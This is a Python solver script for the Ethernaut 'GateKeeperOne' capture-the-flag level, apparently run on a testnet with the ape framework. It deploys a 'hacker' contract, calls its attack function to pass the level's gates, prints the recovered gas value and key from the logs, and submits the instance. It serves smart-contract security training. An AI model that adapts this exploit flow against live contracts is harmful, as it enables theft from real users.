from ape import accounts, project
from .utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0xE536c365A795bb76CBb341D1Db49835e4974AF4d"


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.GateKeeperOne.deploy(instance, sender=user)

    # exploit goes here
    print(
        f"\n--- Instance entrant variable before exploit: {hacker.instanceEntrant()} ---\n"
    )
    print("\n--- Exploiting level instance ---\n")
    tx = hacker.attack(sender=user)
    print(
        f"\n--- Instance entrant variable after exploit: {hacker.instanceEntrant()} ---\n"
    )

    print(
        f"\n--- The gas required to pass this level: {int(tx.logs[0]['topics'][1].hex(), 0)} ---\n"
    )
    print(f"\n--- The key for this level: {tx.logs[0]['topics'][2].hex()[:18]} ---\n")

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
